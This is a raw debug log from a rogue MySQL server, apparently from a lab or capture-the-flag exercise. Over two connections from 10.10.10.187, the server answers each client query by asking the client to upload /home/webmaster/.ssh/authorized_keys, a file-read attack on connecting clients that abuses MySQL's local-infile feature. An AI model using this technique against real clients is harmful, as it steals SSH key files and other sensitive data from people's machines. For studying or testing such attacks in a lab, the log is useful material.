2020-05-15 20:20:02,330:INFO:Conn from: ('10.10.10.187', 60718)
2020-05-15 20:20:02,330:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
2020-05-15 20:20:02,399:DEBUG:Data recved: 'N\x00\x00'
2020-05-15 20:20:02,400:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00a\x00\x14\x1bt\xd4\xe2o\xf8\x97Q\xf1\x9c\x81\x9d\x91\x84\x0eO70\x8b\xc7\x00mysql_native_password\x00'
2020-05-15 20:20:02,400:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:02,400:INFO:Last packet
2020-05-15 20:20:02,471:DEBUG:Data recved: '\x0f\x00\x00'
2020-05-15 20:20:02,472:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
2020-05-15 20:20:02,472:INFO:Query
2020-05-15 20:20:02,472:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:02,543:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:02,543:DEBUG:Data recved: '\x02'
2020-05-15 20:20:02,543:INFO:-- result
2020-05-15 20:20:02,543:INFO:Result: '\x02'
2020-05-15 20:20:02,543:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:02,543:INFO:Last packet
2020-05-15 20:20:02,611:DEBUG:Data recved: '\x0f\x00\x00'
2020-05-15 20:20:02,611:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
2020-05-15 20:20:02,611:INFO:Query
2020-05-15 20:20:02,611:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:02,683:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:02,683:DEBUG:Data recved: '\x02'
2020-05-15 20:20:02,683:INFO:-- result
2020-05-15 20:20:02,683:INFO:Result: '\x02'
2020-05-15 20:20:02,683:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:02,683:INFO:Last packet
2020-05-15 20:20:02,753:DEBUG:Data recved: '\x0f\x00\x00'
2020-05-15 20:20:02,753:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
2020-05-15 20:20:02,753:INFO:Query
2020-05-15 20:20:02,753:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:02,826:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:02,826:DEBUG:Data recved: '\x02'
2020-05-15 20:20:02,826:INFO:-- result
2020-05-15 20:20:02,826:INFO:Result: '\x02'
2020-05-15 20:20:02,826:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:02,826:INFO:Last packet
2020-05-15 20:20:02,897:DEBUG:Data recved: '.\x00\x00'
2020-05-15 20:20:02,898:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
2020-05-15 20:20:02,898:INFO:Query
2020-05-15 20:20:02,898:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:02,967:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:02,967:DEBUG:Data recved: '\x02'
2020-05-15 20:20:02,967:INFO:-- result
2020-05-15 20:20:02,967:INFO:Result: '\x02'
2020-05-15 20:20:02,967:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:02,967:INFO:Last packet
2020-05-15 20:20:03,037:DEBUG:Data recved: '\x02\x00\x00'
2020-05-15 20:20:03,038:DEBUG:Data recved: '\x00\x02a'
2020-05-15 20:20:03,038:DEBUG:Pushed: '\x07\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:03,038:INFO:Last packet
2020-05-15 20:20:03,106:DEBUG:Data recved: '\x0c\x00\x00'
2020-05-15 20:20:03,106:DEBUG:Data recved: '\x00\x03SHOW TABLES'
2020-05-15 20:20:03,106:INFO:Query
2020-05-15 20:20:03,106:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:03,177:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:03,177:DEBUG:Data recved: '\x02'
2020-05-15 20:20:03,177:INFO:-- result
2020-05-15 20:20:03,177:INFO:Result: '\x02'
2020-05-15 20:20:03,177:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:03,177:INFO:Last packet
2020-05-15 20:20:03,247:DEBUG:Data recved: '\x02\x00\x00'
2020-05-15 20:20:03,247:DEBUG:Data recved: '\x00\x02a'
2020-05-15 20:20:03,248:DEBUG:Pushed: '\x07\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:03,248:INFO:Last packet
2020-05-15 20:20:03,317:DEBUG:Data recved: '\x12\x00\x00'
2020-05-15 20:20:03,317:DEBUG:Data recved: '\x00\x03SHOW TABLE STATUS'
2020-05-15 20:20:03,317:INFO:Query
2020-05-15 20:20:03,317:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:03,384:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:03,385:DEBUG:Data recved: '\x02'
2020-05-15 20:20:03,385:INFO:-- result
2020-05-15 20:20:03,385:INFO:Result: '\x02'
2020-05-15 20:20:03,385:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:03,385:INFO:Last packet
2020-05-15 20:20:03,566:INFO:Conn from: ('10.10.10.187', 60720)
2020-05-15 20:20:03,566:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
2020-05-15 20:20:03,636:DEBUG:Data recved: 'N\x00\x00'
2020-05-15 20:20:03,637:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00a\x00\x14\x1bt\xd4\xe2o\xf8\x97Q\xf1\x9c\x81\x9d\x91\x84\x0eO70\x8b\xc7\x00mysql_native_password\x00'
2020-05-15 20:20:03,637:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:03,637:INFO:Last packet
2020-05-15 20:20:03,706:DEBUG:Data recved: '\x0f\x00\x00'
2020-05-15 20:20:03,706:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
2020-05-15 20:20:03,707:INFO:Query
2020-05-15 20:20:03,707:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:03,777:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:03,777:DEBUG:Data recved: '\x02'
2020-05-15 20:20:03,777:INFO:-- result
2020-05-15 20:20:03,778:INFO:Result: '\x02'
2020-05-15 20:20:03,778:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:03,778:INFO:Last packet
2020-05-15 20:20:03,848:DEBUG:Data recved: '\x0f\x00\x00'
2020-05-15 20:20:03,848:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
2020-05-15 20:20:03,848:INFO:Query
2020-05-15 20:20:03,848:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:03,917:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:03,917:DEBUG:Data recved: '\x02'
2020-05-15 20:20:03,917:INFO:-- result
2020-05-15 20:20:03,918:INFO:Result: '\x02'
2020-05-15 20:20:03,918:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:03,918:INFO:Last packet
2020-05-15 20:20:03,987:DEBUG:Data recved: '\x0f\x00\x00'
2020-05-15 20:20:03,987:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
2020-05-15 20:20:03,987:INFO:Query
2020-05-15 20:20:03,987:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:04,056:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:04,056:DEBUG:Data recved: '\x02'
2020-05-15 20:20:04,056:INFO:-- result
2020-05-15 20:20:04,056:INFO:Result: '\x02'
2020-05-15 20:20:04,056:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:04,056:INFO:Last packet
2020-05-15 20:20:04,127:DEBUG:Data recved: '.\x00\x00'
2020-05-15 20:20:04,128:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
2020-05-15 20:20:04,128:INFO:Query
2020-05-15 20:20:04,128:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:04,195:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:04,195:DEBUG:Data recved: '\x02'
2020-05-15 20:20:04,195:INFO:-- result
2020-05-15 20:20:04,195:INFO:Result: '\x02'
2020-05-15 20:20:04,196:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:04,196:INFO:Last packet
2020-05-15 20:20:04,267:DEBUG:Data recved: '\x02\x00\x00'
2020-05-15 20:20:04,267:DEBUG:Data recved: '\x00\x02a'
2020-05-15 20:20:04,267:DEBUG:Pushed: '\x07\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:04,267:INFO:Last packet
2020-05-15 20:20:04,334:DEBUG:Data recved: '\x17\x00\x00'
2020-05-15 20:20:04,334:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
2020-05-15 20:20:04,334:INFO:Query
2020-05-15 20:20:04,335:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:04,402:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:04,403:DEBUG:Data recved: '\x02'
2020-05-15 20:20:04,403:INFO:-- result
2020-05-15 20:20:04,403:INFO:Result: '\x02'
2020-05-15 20:20:04,403:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:04,403:INFO:Last packet
2020-05-15 20:20:04,471:DEBUG:Data recved: '\x0f\x00\x00'
2020-05-15 20:20:04,471:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
2020-05-15 20:20:04,471:INFO:Query
2020-05-15 20:20:04,471:DEBUG:Pushed: '%\x00\x00\x01\xfb/home/webmaster/.ssh/authorized_keys'
2020-05-15 20:20:04,542:DEBUG:Data recved: '\x00\x00\x00'
2020-05-15 20:20:04,542:DEBUG:Data recved: '\x02'
2020-05-15 20:20:04,542:INFO:-- result
2020-05-15 20:20:04,542:INFO:Result: '\x02'
2020-05-15 20:20:04,542:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:04,542:INFO:Last packet
2020-05-15 20:20:04,614:DEBUG:Data recved: '\x01\x00\x00'
2020-05-15 20:20:04,614:DEBUG:Data recved: '\x00\x01'
2020-05-15 20:20:04,614:DEBUG:Data recved: '\x02\x00\x00'
2020-05-15 20:20:04,614:DEBUG:Data recved: '\x00\x02a'
2020-05-15 20:20:04,614:DEBUG:Pushed: '\x07\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00'
2020-05-15 20:20:04,614:INFO:Last packet
2020-05-15 20:20:04,685:DEBUG:Data recved: '\x01\x00\x00'
2020-05-15 20:20:04,686:DEBUG:Data recved: '\x00\x01'
